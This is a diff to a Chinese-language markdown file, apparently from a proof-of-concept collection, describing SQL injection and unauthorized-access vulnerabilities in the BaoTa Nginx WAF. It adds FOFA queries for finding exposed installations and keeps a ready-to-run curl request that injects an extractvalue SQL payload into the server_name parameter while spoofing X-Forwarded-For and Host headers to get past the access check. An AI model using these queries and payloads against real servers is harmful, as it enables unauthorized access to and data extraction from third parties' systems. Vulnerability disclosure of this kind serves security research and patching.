@@ -2,6 +2,13 @@
 
 WAF 防火墙 (宝塔 Nginx 防火墙) 存在 SQL 注入漏洞和未授权漏洞
 
+## fofa
+```
+title=='404 - Website not exist!'
+
+"宝塔"
+```
+
 ## 未授权
 
 漏洞代码
@@ -53,9 +60,12 @@ curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarde
 
 ```
 ## sql注入
+
 ```
 curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
 ```
+![image](https://github.com/wy876/POC/assets/139549762/bbd89fb6-b9b7-4628-a33d-57fc7b8708e5)
+
 
 ## 漏洞来源
 - https://mp.weixin.qq.com/s/7AqKcCS9puZgb9lG2KcAsg
